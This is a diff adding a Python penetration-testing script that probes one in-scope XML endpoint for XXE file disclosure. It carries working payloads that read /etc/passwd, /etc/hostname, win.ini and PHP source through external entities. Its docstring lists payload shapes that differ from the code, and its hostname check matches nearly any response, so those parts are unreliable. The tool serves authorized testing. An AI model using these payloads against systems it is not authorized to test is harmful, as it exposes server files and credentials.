@@ -1,0 +1,303 @@
+#!/usr/bin/env python3
+"""Deterministic XXE (XML External Entity) probe for a known HTTP endpoint.
+
+Sends a bounded set of XXE payload shapes to a POST (or GET with XML body)
+endpoint and classifies the response as XXE-confirmed when the fetched
+local file content leaks into the response body. Catches the classic file-
+disclosure XXE primitive used in SOAP, XML-RPC and legacy XML intake APIs.
+
+Usage:
+  vapt-xxe-probe --target <host> --url <xml-endpoint-url>
+    [--method POST|GET] [--param <query-param-for-GET>]
+    [--extra-fields k=v,k2=v2]
+
+Design (argv-only, no shell, no eval, in-scope-only):
+  * 6 payload shapes tried in order: SYSTEM entity /etc/passwd, SYSTEM entity
+    Windows C:\\Windows\\win.ini, SYSTEM php:// filter base64, parameter-
+    entity blind (CDATA-wrapped), SOAP envelope wrapper, generic XML wrapper.
+  * 10 s per attempt, 90 s total wall clock.
+  * ONE request per payload — never a sweeping sweep.
+  * NEVER sends OOB payloads to arbitrary hosts (XXE OOB needs an attacker-
+    controlled listener; this tool is in-scope-only and does file-disclosure
+    only). OOB is reserved for a future interactsh-wired path.
+  * NEVER follows redirects.
+  * ALWAYS runs with a bounded body cap (16 KB on return) so a server that
+    accidentally dumps /etc/shadow doesn't flood the ledger.
+
+Output: ONE JSON record to stdout:
+    {"findings": [{"type": "xxe", "severity": "critical",
+                   "url": "<url>", "payload": "<shape>",
+                   "evidence": "<file content excerpt>",
+                   "confirmed": true}],
+     "trace":    [{"shape","status","elapsed_ms","len","note"}, ...]}
+
+Fails SAFE on every error (empty findings, trace preserved for audit).
+"""
+from __future__ import annotations
+
+import argparse
+import json
+import os
+import re
+import sys
+import time
+from urllib.parse import urlparse
+
+try:
+    import requests
+except Exception as e:
+    print(json.dumps({"error": f"requests not available: {e}", "findings": []}))
+    sys.exit(0)
+
+_UA = "vapt-xxe-probe/1.0 (authorized assessment)"
+_REQ_TIMEOUT = 10
+_TOTAL_BUDGET_S = 90
+_BODY_CAP = 16 * 1024
+
+# Payload shapes — each one targets a different parser quirk. The exact
+# marker text in the response body is what we grep for to classify.
+_PAYLOADS: tuple[tuple[str, str, str, str], ...] = (
+    # (shape_name, content_type, body, expected_marker_regex)
+    (
+        "unix_etc_passwd_system",
+        "application/xml",
+        '<?xml version="1.0"?>\n'
+        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n'
+        '<foo>&xxe;</foo>',
+        r"root:[x\*0-9A-Za-z/]*:0:0:",
+    ),
+    (
+        "unix_etc_passwd_param_entity",
+        "application/xml",
+        '<?xml version="1.0"?>\n'
+        '<!DOCTYPE foo [\n'
+        '  <!ENTITY % xxe SYSTEM "file:///etc/passwd">\n'
+        '  %xxe;\n'
+        ']>\n'
+        '<foo>test</foo>',
+        r"root:[x\*0-9A-Za-z/]*:0:0:",
+    ),
+    (
+        "unix_etc_hostname",
+        "application/xml",
+        '<?xml version="1.0"?>\n'
+        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>\n'
+        '<foo>&xxe;</foo>',
+        r"[a-z0-9][a-z0-9\-.]{2,62}",   # a hostname
+    ),
+    (
+        "windows_win_ini",
+        "application/xml",
+        '<?xml version="1.0"?>\n'
+        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>\n'
+        '<foo>&xxe;</foo>',
+        r"\[fonts\]|\[extensions\]|for 16-bit app support",
+    ),
+    (
+        "php_filter_b64",
+        "application/xml",
+        '<?xml version="1.0"?>\n'
+        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM '
+        '"php://filter/convert.base64-encode/resource=index.php">]>\n'
+        '<foo>&xxe;</foo>',
+        r"PD9waHA|PD9QSFA",     # "<?php" base64
+    ),
+    (
+        "soap_envelope_wrapper",
+        "text/xml",
+        '<?xml version="1.0" encoding="utf-8"?>\n'
+        '<!DOCTYPE soap:Envelope [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n'
+        '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">\n'
+        '  <soap:Body><data>&xxe;</data></soap:Body>\n'
+        '</soap:Envelope>',
+        r"root:[x\*0-9A-Za-z/]*:0:0:",
+    ),
+)
+
+
+def _in_scope(target_host: str, url: str) -> bool:
+    try:
+        return urlparse(url).hostname == target_host
+    except Exception:
+        return False
+
+
+def _parse_extras(s: str) -> dict:
+    out: dict[str, str] = {}
+    if not s:
+        return out
+    for part in s.split(","):
+        part = part.strip()
+        if not part or "=" not in part:
+            continue
+        k, _, v = part.partition("=")
+        k = k.strip()
+        v = v.strip()
+        if k:
+            out[k] = v
+    return out
+
+
+def _try_payload(url: str, method: str, body: str, content_type: str,
+                 param: str, extras: dict, cookie: str,
+                 timeout: int) -> dict:
+    """Submit one XXE payload. Returns a classification dict."""
+    t0 = time.time()
+    headers = {
+        "User-Agent": _UA,
+        "Content-Type": content_type,
+        "Accept": "*/*",
+    }
+    if cookie:
+        headers["Cookie"] = cookie
+    try:
+        if method.lower() == "get":
+            # Rare but seen: XML passed as a query-string value. The caller
+            # names the param (default `xml`). This path is a last-ditch
+            # attempt since most servers want POST + Content-Type: xml.
+            qp = (param or "xml").strip()
+            r = requests.get(
+                url,
+                params={qp: body, **extras},
+                headers=headers,
+                timeout=timeout,
+                allow_redirects=False,
+                verify=False,
+            )
+        else:
+            # POST — the main path.
+            if extras:
+                # When extras exist, the server likely expects a form POST
+                # with the XML as one field — the hidden "xml"/"data"
+                # field convention. The caller can override by setting
+                # --param.
+                qp = (param or "xml").strip()
+                r = requests.post(
+                    url,
+                    data={qp: body, **extras},
+                    headers={**headers, "Content-Type":
+                             "application/x-www-form-urlencoded"},
+                    timeout=timeout,
+                    allow_redirects=False,
+                    verify=False,
+                )
+            else:
+                # Plain POST with the XML as the raw body.
+                r = requests.post(
+                    url,
+                    data=body,
+                    headers=headers,
+                    timeout=timeout,
+                    allow_redirects=False,
+                    verify=False,
+                )
+        elapsed = int((time.time() - t0) * 1000)
+        text = (r.text or "")[:_BODY_CAP]
+        return {
+            "status": r.status_code,
+            "elapsed_ms": elapsed,
+            "body": text,
+            "len": len(r.text or ""),
+        }
+    except Exception as e:
+        return {
+            "status": 0,
+            "elapsed_ms": int((time.time() - t0) * 1000),
+            "body": "",
+            "len": 0,
+            "note": f"{type(e).__name__}: {str(e)[:160]}",
+        }
+
+
+def main() -> int:
+    ap = argparse.ArgumentParser(description="Deterministic XXE probe")
+    ap.add_argument("--target", required=True,
+                    help="Scope host (url must match this host).")
+    ap.add_argument("--url", required=True, help="XML-intake endpoint URL.")
+    ap.add_argument("--method", default="post",
+                    choices=("post", "get", "POST", "GET"),
+                    help="HTTP method (default: post).")
+    ap.add_argument("--param", default="",
+                    help="Query-string / form field name to carry the XML "
+                         "when the server expects it in a param (default: "
+                         "raw body on POST, 'xml' on GET).")
+    ap.add_argument("--extra-fields", default="",
+                    help="Extra form fields as k=v,k2=v2 (CSRF tokens, "
+                         "action selectors, etc.).")
+    ap.add_argument("--cookie", default=os.environ.get(
+        "VAPT_WEB_LOGIN_COOKIE", ""),
+                    help="Optional Cookie header value (passed through "
+                         "VAPT_WEB_LOGIN_COOKIE env by default).")
+    args = ap.parse_args()
+
+    url = args.url.strip()
+    if not url.lower().startswith(("http://", "https://")):
+        print(json.dumps({"error": "url must be http(s)", "findings": []}))
+        return 0
+    if not _in_scope(args.target, url):
+        print(json.dumps({"error": "url off-scope", "findings": []}))
+        return 0
+
+    try:
+        requests.packages.urllib3.disable_warnings()  # type: ignore[attr-defined]
+    except Exception:
+        pass
+
+    # Sentinel handling — mirrors weak_cred_probe's convention. The catalog
+    # layer passes __NONE__ when the caller omitted a field so _mk_build
+    # doesn't drop the preceding flag + desync argparse.
+    _xf = args.extra_fields.strip()
+    extras = _parse_extras("" if _xf == "__NONE__" else _xf)
+    cookie = (args.cookie or "").strip()
+    method = args.method.lower()
+    if args.param.strip() == "__NONE__":
+        args.param = ""
+
+    trace: list[dict] = []
+    findings: list[dict] = []
+    t_start = time.time()
+
+    for (shape, ctype, body, marker) in _PAYLOADS:
+        if time.time() - t_start >= _TOTAL_BUDGET_S:
+            break
+        res = _try_payload(url, method, body, ctype,
+                           args.param, extras, cookie, _REQ_TIMEOUT)
+        matched = False
+        excerpt = ""
+        if res.get("body"):
+            m = re.search(marker, res["body"], re.IGNORECASE)
+            if m:
+                matched = True
+                # Take a short excerpt around the marker so operators can
+                # see the leaked file content without the full dump.
+                _s = max(0, m.start() - 40)
+                _e = min(len(res["body"]), m.end() + 120)
+                excerpt = res["body"][_s:_e]
+        trace.append({
+            "shape": shape,
+            "status": res.get("status"),
+            "elapsed_ms": res.get("elapsed_ms"),
+            "len": res.get("len"),
+            "note": res.get("note", ""),
+            "matched": matched,
+        })
+        if matched:
+            findings.append({
+                "type": "xxe",
+                "severity": "critical",
+                "url": url,
+                "payload": shape,
+                "evidence": excerpt[:400],
+                "confirmed": True,
+            })
+            # One confirmed finding is enough — a confirmed XXE on one
+            # payload shape means the parser is vulnerable; adding more
+            # payload hits just increases ledger noise.
+            break
+
+    print(json.dumps({"findings": findings, "trace": trace}))
+    return 0
+
+
+if __name__ == "__main__":
+    sys.exit(main())
